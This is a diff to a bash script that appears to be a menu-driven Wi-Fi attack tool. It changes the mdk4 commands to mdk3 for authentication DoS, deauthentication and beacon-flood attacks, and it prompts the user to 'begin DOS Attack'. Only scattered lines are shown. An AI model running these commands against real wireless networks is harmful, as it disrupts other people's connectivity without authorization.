@@ -8,7 +8,7 @@ clear
 echo ""
 echo "Before We begin you need to make sure you have the following installed"
 echo ""
-echo "1. mdk4"
+echo "1. mdk3"
 echo ""
 echo "2. aircrack-ng package"
 echo ""
@@ -459,7 +459,7 @@ then
 		clear
 	fi
 	clear
-	final="sudo mdk4 $card a"
+	final="sudo mdk3 $card a"
 	echo "Press Enter to begin DOS Attack and use CTRL+C to stop it"
 	read sdojfgskldfghl
 	if [[ $bssid != "" ]]
@@ -540,7 +540,7 @@ then
 		read channels
 		clear
 	fi
-	din="sudo mdk4 $card d"
+	din="sudo mdk3 $card d"
 	if [[ $channels != "" ]]
 	then
 		din=$din" -c $channels"
@@ -625,7 +625,7 @@ then
 	clear
 	echo ""
 	echo ""
-	beacon="sudo mdk4 $card b"
+	beacon="sudo mdk3 $card b"
 	if [[ $ib != "" ]]
 	then
 		beacon=$beacon" -n $ib"
@@ -691,10 +691,6 @@ then
 	read hellomanhowisitgoingthanksforreadingthiscode
 	bash damnscary.sh
 fi
-
-
-
-
 
 
 
